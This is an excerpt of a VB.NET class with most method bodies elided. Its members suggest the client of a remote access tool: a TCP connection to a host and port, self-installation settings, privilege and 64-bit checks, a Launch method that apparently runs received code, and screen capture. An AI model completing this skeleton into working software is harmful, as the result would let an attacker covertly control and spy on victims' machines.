...
Public Class Class1
    ...
    Private Property Install_D As String
    Private Property Install_N As String
    Private Property Install_T As String

    Private T As TcpClient = New TcpClient()

    Sub New(ByVal HH As String, ByVal PP As String, ByVal IInstall_D As String, ByVal IInstall_N As String, ByVal IInstall_T As String)
        Me.H = HH
        Me.P = PP
        Me.Install_D = IInstall_D
        Me.Install_N = IInstall_N
        Me.Install_T = IInstall_T
    End Sub
    ...
    Private Function Check64Bit() As String
        ...
        End If
    End Function
    Private Function Privilege() As String
    ...
    Public Async Sub Launch(ByVal k As TcpClient, ByVal B As Byte(), ByVal P As Object(), ByVal CSharp As Boolean)
    ...
    Public Sub Capture(ByVal W As Integer, ByVal H As Integer, ByVal Q As Integer, ByVal F As String)
